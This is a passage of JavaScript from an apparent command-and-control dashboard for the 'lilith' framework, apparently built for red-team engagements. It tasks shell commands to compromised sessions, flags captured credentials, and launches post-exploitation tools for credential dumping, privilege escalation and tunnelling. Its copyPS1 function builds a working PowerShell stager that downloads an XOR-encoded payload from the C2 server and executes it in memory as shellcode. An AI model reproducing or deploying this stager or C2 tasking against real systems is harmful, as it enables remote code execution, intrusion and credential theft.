        const res = await fetch(`/ui/api/c2/${selectedSid}/result/${task_id}`);
        if (res.status === 200) {
          clearInterval(iv);
          delete pendingPolls[task_id];
          const txt = await res.text();
          pendEl.remove();
          appendShellResult(task_id, txt, false);
        } else if (res.status !== 204) {
          clearInterval(iv);
          pendEl.textContent = '  [!] error '+res.status;
          pendEl.className = 'sl sl-err';
        }
      } catch(_) {}
      if (n > 150) { clearInterval(iv); pendEl.textContent = '  [!] timeout'; pendEl.className='sl sl-err'; }
    }, 2000);
    pendingPolls[task_id] = iv;
  } catch(e) {
    pendEl.textContent = '  [!] '+e.message;
    pendEl.className = 'sl sl-err';
  }
}

function shellAppendCmd(cmd) {
  const out = document.getElementById('shell-out');
  const d   = document.createElement('div');
  d.className = 'sl sl-cmd-line';
  d.innerHTML = `<span class="sl-prompt">C2&gt;</span><span class="sl-cmd">${esc(cmd)}</span>`;
  out.appendChild(d);
  shellScroll();
  return d;
}

function shellAppend(type, text) {
  const out = document.getElementById('shell-out');
  const d   = document.createElement('div');
  d.className = 'sl sl-'+type;
  d.textContent = text;
  out.appendChild(d);
  shellScroll();
  return d;
}

function appendShellResult(tid, txt, hasCreds) {
  const out = document.getElementById('shell-out');
  const d   = document.createElement('div');
  d.className = 'sl sl-output';
  if (hasCreds) {
    d.className = 'sl sl-cred';
    d.textContent = '⚷ CREDS DETECTED\n' + txt;
  } else {
    d.textContent = txt || '(empty)';
  }
  out.appendChild(d);
  shellScroll();
  // refresh session to pick up DB updates
  setTimeout(() => refreshSession(), 800);
}

function shellScroll() {
  const el = document.getElementById('shell-out');
  el.scrollTop = el.scrollHeight;
}

function shellClear() {
  document.getElementById('shell-out').innerHTML = '';
}

async function killSession() {
  if (!selectedSid || !confirm('Kill session '+selectedSid+'?')) return;
  await fetch('/ui/api/c2/'+selectedSid, {method:'DELETE'});
  deselectSession();
  await loadLive();
}

async function dismissSession(sid) {
  await fetch('/ui/api/sessions/'+sid, {method:'DELETE'});
  dbSessions = dbSessions.filter(s => s.id !== sid);
  if (liveSessions[sid]) delete liveSessions[sid];
  if (selectedSid === sid) deselectSession();
  renderSessList();
  updateArsSessSelect();
}

// ── Arsenal ────────────────────────────────────────────────────────────────
let arsTab = 'files';
let arsSid = '';   // session selected in Arsenal dropdown (independent of selectedSid)

function updateArsSessSelect() {
  const sel = document.getElementById('ars-sess-sel');
  if (!sel) return;
  const cur = arsSid || sel.value;
  const live = Object.entries(liveSessions).filter(([,v])=>!v.stale);
  sel.innerHTML = '<option value="">— select session —</option>' +
    live.map(([sid,v]) => {
      const db = dbSessions.find(s=>s.id===sid);
      const label = db?.label ? ` [${db.label}]` : '';
      const sel_ = cur===sid ? ' selected' : '';
      return `<option value="${esc(sid)}"${sel_}>${esc(sid.slice(0,14))} ${esc(v.host)}${esc(label)}</option>`;
    }).join('');
  arsSid = sel.value;
  // update tool buttons state
  document.querySelectorAll('.tool-run').forEach(b => {
    b.disabled = !arsSid || !b.dataset.built;
  });
}

function onArsSessChange() {
  arsSid = document.getElementById('ars-sess-sel').value;
  document.querySelectorAll('.tool-run').forEach(b => {
    b.disabled = !arsSid || !b.dataset.built;
  });
}

function setArsTab(tab) {
  arsTab = tab;
  document.getElementById('ars-files').style.display = tab === 'files' ? 'block' : 'none';
  document.getElementById('ars-tools').style.display = tab === 'tools' ? 'block' : 'none';
  document.getElementById('ars-tab-files').classList.toggle('active', tab === 'files');
  document.getElementById('ars-tab-tools').classList.toggle('active', tab === 'tools');
  if (tab === 'tools') loadTools();
}

function reloadArsenal() {
  if (arsTab === 'files') loadArsenal();
  else loadTools();
}

async function loadTools() {
  const body = document.getElementById('arsenal-tools-body');
  const hint = document.getElementById('ars-sess-hint');
  if (hint) hint.textContent = selectedSid
    ? `session: ${selectedSid.slice(0,14)}`
    : '— select a session to enable Run';
  body.innerHTML = '<div style="padding:16px;color:var(--dim);font-size:11px">Loading…</div>';
  try {
    const {tools} = await fetch('/ui/api/arsenal/tools').then(r=>r.json());
    if (!tools?.length) { body.innerHTML='<div style="padding:16px;color:var(--dim)">No tools in catalog</div>'; return; }

    // Group by category derived from desc keywords
    const cats = {
      cred:  {l:'CREDENTIAL ACCESS',    keys:['Credential','DPAPI','Shadow','Kerberos','Chrome creds','Kerberos','NTLM']},
      disc:  {l:'DISCOVERY / ENUM',     keys:['BloodHound','LDAP','Account','Network','AD CS','Enum','Domain','SQL']},
      priv:  {l:'PRIVILEGE ESCALATION', keys:['SYSTEM','Impersonate','Potato','PrintSpoofer','LPE','privilege']},
      lat:   {l:'LATERAL / TUNNEL',     keys:['tunnel','relay','SOCKS','Ligolo','Chisel']},
      other: {l:'OTHER',                keys:[]},
    };
    const bucket = t => {
      const d = (t.desc||'').toLowerCase();
      if (/kerberos|ticket|shadow cred|credential|dpapi|chrome cred|mimikatz/i.test(d)) return 'cred';
      if (/bloodhound|ldap|enum|account|network|domain|ad cs|sql|winpeas/i.test(d)) return 'disc';
      if (/system|impersonate|potato|spoofer|lpe|privilege|race|escalat/i.test(d)) return 'priv';
      if (/tunnel|relay|socks|ligolo|chisel|proxy/i.test(d)) return 'lat';
      return 'other';
    };
    const grouped = {cred:[],disc:[],priv:[],lat:[],other:[]};
    tools.forEach(t => grouped[bucket(t)].push(t));

    let html = '';
    Object.entries(cats).forEach(([k, cat]) => {
      const rows = grouped[k];
      if (!rows.length) return;
      html += `<div class="tool-cat-hdr">${cat.l}</div>`;
      rows.forEach(t => {
        const st  = t.built ? '<span style="color:var(--glow)">✓</span>'
                  : t.binary_found ? '<span style="color:var(--amber)" title="binary found, not encoded">○</span>'
                  : '<span style="color:var(--dim)" title="binary not found">✗</span>';
        const dis = !t.built ? 'disabled' : (!arsSid ? 'disabled' : '');
        const hint2 = !t.built
          ? (t.binary_found ? `title="encode first: lilith build --tool ${esc(t.name)}"` : `title="binary not found"`)
          : '';
        html += `<div class="tool-row">
          <span class="tool-status">${st}</span>
          <span class="tool-name">${esc(t.name)}</span>
          <span class="tool-desc">${esc(t.desc)}</span>
          <input class="tool-params" id="tp-${esc(t.name)}" type="text" value="${esc(t.args||t.default_params||'')}"
                 placeholder="params" spellcheck="false">
          <button class="tool-run" ${dis} ${hint2} data-built="${t.built?'1':''}"
                  onclick="runTool('${esc(t.name)}',this)">Run ▸</button>
        </div>`;
      });
    });
    body.innerHTML = html;
    updateArsSessSelect();
  } catch(e) { body.innerHTML=`<div style="padding:16px;color:var(--red2)">${esc(e.message)}</div>`; }
}

async function runTool(name, btn) {
  const targetSid = arsSid || selectedSid;
  if (!targetSid) { alert('Select a session in the dropdown first'); return; }
  const params = document.getElementById('tp-'+name)?.value || '';
  btn.disabled = true;
  btn.textContent = '…';
  try {
    const r = await fetch('/ui/api/arsenal/run', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({session_id: targetSid, tool_name: name, params}),
    });
    const d = await r.json();
    if (!r.ok) {
      btn.textContent = 'ERR';
      btn.style.color = 'var(--red2)';
      setTimeout(()=>{ btn.textContent='Run ▸'; btn.style.color=''; btn.disabled=false; }, 2000);
      return;
    }
    const {task_id} = d;
    btn.textContent = 'Sent ✓';
    btn.classList.add('ok');
    setGV('ops');
    setTab('shell');
    // pending line + fallback poll (SSE fires first in normal flow)
    const pendEl = shellAppend('output', `▸ [TOOL] ${name} …`);
    pendingEls[task_id] = pendEl;
    let n = 0;
    const iv = setInterval(async () => {
      n++;
      try {
        const res = await fetch(`/ui/api/c2/${targetSid}/result/${task_id}`);
        if (res.status === 200) {
          clearInterval(iv); delete pendingPolls[task_id]; delete pendingEls[task_id];
          pendEl.remove();
          appendShellResult(task_id, await res.text(), false);
        }
      } catch(_) {}
      if (n > 150) { clearInterval(iv); pendEl.textContent = '  [!] timeout'; pendEl.className='sl sl-err'; }
    }, 2000);
    pendingPolls[task_id] = iv;
    setTimeout(()=>{ btn.textContent='Run ▸'; btn.classList.remove('ok'); btn.disabled=false; }, 2000);
  } catch(e) {
    btn.textContent = 'ERR';
    setTimeout(()=>{ btn.textContent='Run ▸'; btn.disabled=false; }, 2000);
  }
}

async function loadArsenal() {
  const body = document.getElementById('arsenal-body');
  const wsEl = document.getElementById('arsenal-ws');
  try {
    const [{workspace, files}, vers] = await Promise.all([
      fetch('/ui/api/arsenal').then(r=>r.json()),
      fetch('/ui/api/arsenal/versions').then(r=>r.json()).catch(()=>({})),
    ]);
    wsEl.textContent = 'Workspace: '+(workspace||'—');
    if (!files?.length) { body.innerHTML='<div style="color:var(--dim)">Empty workspace</div>'; return; }
    const cats = {enc:{l:'ENCODED PAYLOADS',i:[]},dat:{l:'STAGED DATA',i:[]},
                  ps1:{l:'POWERSHELL STAGERS',i:[]},exe:{l:'EXECUTABLES',i:[]},other:{l:'OTHER',i:[]}};
    files.forEach(f => {
      const k = f.ext.replace('.','');
      (cats[k]||cats.other).i.push(f);
    });
    const base = window.location.protocol+'//'+window.location.host;
    let html = '';
    Object.values(cats).forEach(cat => {
      if (!cat.i.length) return;
      html += `<div class="art-cat">${cat.l}</div>`;
      cat.i.forEach(f => {
        const url = base+'/'+f.name;
        const vh  = (vers||{})[f.name] || [];
        const vbadge = vh.length
          ? `<span style="font-size:9px;color:var(--dim2);margin-right:4px" title="${esc(vh[vh.length-1]?.sha256||'')}">v${vh.length}</span>`
          : '';
        html += `<div class="file-row">
          <span class="file-ext">${esc(f.ext||'?')}</span>
          <span class="file-name">${vbadge}${esc(f.name)}</span>
          <span class="file-size">${fmtSize(f.size)}</span>
          <button class="cbtn" onclick="copyURL(this,'${esc(url)}')">URL</button>
          <button class="cbtn" onclick="copyPS1(this,'${esc(f.name)}')">PS1</button>
        </div>`;
      });
    });
    body.innerHTML = html;
  } catch(e) { body.innerHTML='<div style="color:var(--red2)">'+esc(e.message)+'</div>'; }
}

function copyURL(btn, url) {
  navigator.clipboard.writeText(url).then(() => {
    btn.textContent='copied!'; btn.classList.add('ok');
    setTimeout(()=>{btn.textContent='URL';btn.classList.remove('ok');},1500);
  });
}

function copyPS1(btn, fname) {
  const base = window.location.protocol+'//'+window.location.host;
  const ps = `$d=(New-Object Net.WebClient).DownloadData('${base}/${fname}');$k=0x5A;` +
    `$d=[byte[]]($d|%{$_-bxor$k});$h=[System.Runtime.InteropServices.GCHandle]::Alloc($d,3);` +
    `([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($h.AddrOfPinnedObject(),[Action]))()`;
  navigator.clipboard.writeText(ps).then(() => {
    btn.textContent='copied!'; btn.classList.add('ok');
    setTimeout(()=>{btn.textContent='PS1';btn.classList.remove('ok');},1500);
  });
}

// ── ATT&CK ─────────────────────────────────────────────────────────────────
async function loadAttack() {
  try {
    const {all_techniques, tactic_order, covered} = await fetch('/ui/api/techniques').then(r=>r.json());
    document.getElementById('atk-cov').textContent = Object.keys(covered).length;
    document.getElementById('atk-tot').textContent = Object.keys(all_techniques).length;
    const byT = {};
    tactic_order.forEach(t => { byT[t]=[]; });
    Object.entries(all_techniques).forEach(([tid,m]) => {
      if (!byT[m.tactic]) byT[m.tactic]=[];
      byT[m.tactic].push({tid,...m});
    });
    document.getElementById('atk-grid').innerHTML = tactic_order.map(tac =>
      `<div class="atk-col">
        <div class="atk-tac">${esc(tac.toUpperCase())}</div>
        ${(byT[tac]||[]).map(t => {
          const h = covered[t.tid];
          return `<div class="atk-tech ${h?'hit':''}">
            ${esc(t.name)}${h?` ×${h.length}`:''}
            <span class="atk-tid">${esc(t.tid)}</span>
          </div>`;
        }).join('')}
      </div>`).join('');
  } catch(_) {}
}

// ── Report ─────────────────────────────────────────────────────────────────
async function loadReport() {
  try {
    const sessions = await fetch('/ui/api/sessions').then(r=>r.json());
    document.getElementById('label-editor').innerHTML = sessions.map(s => `
      <div style="display:flex;gap:6px;align-items:center;margin-bottom:6px;flex-wrap:wrap">
        <span style="color:var(--dim);width:110px;font-size:10px">${esc((s.id||'').slice(0,14))}</span>
        <input type="text" id="lbl-${esc(s.id)}" placeholder="label" value="${esc(s.label||'')}" style="flex:1;min-width:100px">
        <input type="text" id="nte-${esc(s.id)}" placeholder="note"  value="${esc(s.note||'')}"  style="flex:2;min-width:150px">
        <button class="btn btn-sm" onclick="saveL('${esc(s.id)}')">Save</button>
      </div>`).join('');
  } catch(_) {}
}

async function saveL(sid) {
  const l = document.getElementById('lbl-'+sid)?.value||'';
  const n = document.getElementById('nte-'+sid)?.value||'';
  await fetch('/ui/api/sessions/'+sid+'/label',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({label:l,note:n})});
}

// ── Astaroth ──────────────────────────────────────────────────────────────
let astOpen    = false;
let astPending = {};   // stream_id → DOM element

function toggleAstaroth() {
  astOpen = !astOpen;
  const panel = document.getElementById('astaroth-panel');
  const btn   = document.getElementById('ast-toggle');
  if (astOpen) {
    panel.classList.add('open');
    btn?.classList.add('active');
    updateAstCtx();
    document.getElementById('ast-input').focus();
  } else {
    panel.classList.remove('open');
    btn?.classList.remove('active');
  }
}

function updateAstCtx() {
  const el = document.getElementById('ast-hdr-ctx');
  if (!el) return;
  if (!selectedSid) { el.textContent = 'no session'; return; }
  const live = liveSessions[selectedSid];
  el.textContent = live ? live.host : selectedSid.slice(0,14);
}

function astKey(e) {
  if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); astSend(); }
}

async function astSend() {
  const inp = document.getElementById('ast-input');
  const q   = (inp?.value || '').trim();
  if (!q) return;
  inp.value = '';

  astAppend('user', q);
  const bubble = astAppend('ai', '');
  bubble.classList.add('ast-streaming');

  try {
    const r = await fetch('/ui/api/astaroth/consult', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({question: q, session_id: selectedSid || ''}),
    });
    if (!r.ok) {
      bubble.classList.remove('ast-streaming');
      bubble.textContent = `[error ${r.status}]`;
      return;
    }
    const {stream_id} = await r.json();
    astPending[stream_id] = bubble;
    // ast_token / ast_done events arrive via existing SSE connection
  } catch(e) {
    bubble.classList.remove('ast-streaming');
    bubble.textContent = `[${e.message}]`;
  }
}

function astAppend(type, text) {
  const msgs = document.getElementById('ast-msgs');
  const d    = document.createElement('div');
  d.className = type === 'user' ? 'ast-msg ast-msg-user'
              : type === 'ai'   ? 'ast-msg ast-msg-ai'
              :                   'ast-msg ast-msg-sys';
  d.textContent = text;
  msgs.appendChild(d);
  msgs.scrollTop = msgs.scrollHeight;
  return d;
}

// ── Admin ──────────────────────────────────────────────────────────────────
async function loadAdmin() {
  await Promise.all([loadAdminStatus(), loadAdminEngagement(), loadAdminVersions()]);
}

async function loadAdminStatus() {
  try {
    const d = await fetch('/ui/api/admin/status').then(r=>r.json());
    const s = d.uptime_s || 0;
    const up = s < 3600 ? Math.floor(s/60)+'m' : Math.floor(s/3600)+'h '+Math.floor((s%3600)/60)+'m';
    const rows = [
      ['Uptime',    up],
      ['Live',      d.live_sessions+' sessions'],
      ['Callbacks', d.callbacks],
      ['Auth',      d.auth_enabled ? 'enabled' : 'disabled (open)'],
    ];
    document.getElementById('admin-status-grid').innerHTML =
      rows.map(([k,v])=>`<div class="info-key">${esc(k)}</div><div class="info-val">${esc(String(v))}</div>`).join('');
  } catch(_) {}
}

async function loadAdminEngagement() {
  try {
    const d = await fetch('/ui/api/admin/engagement').then(r=>r.json());
    const map = {name:'eng-name',client:'eng-client',scope:'eng-scope',
                 assessor:'eng-assessor',start_date:'eng-start',end_date:'eng-end'};
    Object.entries(map).forEach(([k,id]) => {
      const el = document.getElementById(id);
      if (el) el.value = d[k] || '';
    });
    const n = document.getElementById('eng-notes');
    if (n) n.value = d.notes || '';
  } catch(_) {}
}

async function saveEngagement() {
  const g = id => document.getElementById(id)?.value || '';
  const data = {name:g('eng-name'),client:g('eng-client'),scope:g('eng-scope'),
                assessor:g('eng-assessor'),start_date:g('eng-start'),
                end_date:g('eng-end'),notes:g('eng-notes')};
  const r = await fetch('/ui/api/admin/engagement',{method:'POST',
    headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
  const btn = document.getElementById('eng-save-btn');
  if (r.ok && btn) {
    btn.textContent = 'Saved ✓';
    setTimeout(()=>{ btn.textContent='Save Config'; },1500);
  }
}

async function loadAdminVersions() {
  const el = document.getElementById('admin-versions');
  try {
    const vers = await fetch('/ui/api/arsenal/versions').then(r=>r.json());
    const names = Object.keys(vers);
    if (!names.length) {
      el.innerHTML = '<div style="color:var(--dim)">No snapshots — click Snapshot or go to Arsenal</div>';
      return;
    }
    el.innerHTML = names.map(n => {
      const hist = vers[n] || [];
      const last = hist[hist.length-1] || {};
      return `<div style="margin-bottom:12px">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">
          <span style="color:var(--text)">${esc(n)}</span>
          <span style="font-size:9px;color:var(--red2);background:var(--red4);border:1px solid var(--red3);
                border-radius:2px;padding:1px 5px">v${hist.length}</span>
        </div>
        ${hist.slice().reverse().slice(0,3).map(v=>`
          <div style="font-size:10px;color:var(--dim);padding:3px 0;border-top:1px solid var(--border)">
            v${v.version} &nbsp;·&nbsp; <span style="color:var(--dim2)">${esc(v.sha256||'')}</span>
            &nbsp;·&nbsp; ${fmtSize(v.size||0)}
            &nbsp;·&nbsp; ${esc((v.built_at||'').slice(0,19))}
          </div>`).join('')}
      </div>`;
    }).join('');
  } catch(_) { el.innerHTML='<div style="color:var(--red2)">Error loading versions</div>'; }
}

async function snapshotPayloads() {
  const r = await fetch('/ui/api/arsenal/snapshot',{method:'POST'});
  const d = await r.json();
  await loadAdminVersions();
  if (curGV === 'arsenal') loadArsenal();
  tick({type:'snapshot',ts:new Date().toISOString().slice(11,19),snapped:d.snapped});
}

async function adminLogout() {
  await fetch('/ui/api/logout',{method:'POST'});
  window.location.href = '/ui/login';
}

// ── bootstrap ──────────────────────────────────────────────────────────────
async function loadLive() {
  try {
    liveSessions = await fetch('/ui/api/c2/sessions').then(r=>r.json());
    renderSessList();
    if (selectedSid) renderSessionHeader();
  } catch(_) {}
}

async function loadDB() {
  try {
    dbSessions = await fetch('/ui/api/sessions').then(r=>r.json());
    renderSessList();
  } catch(_) {}
}

(async () => {
  await Promise.all([loadLive(), loadDB()]);
  connectSSE();
  // Light fallback poll for live session state (stale detection etc.)
  setInterval(loadLive, 10000);
})();
</script>
</body>
</html>"""
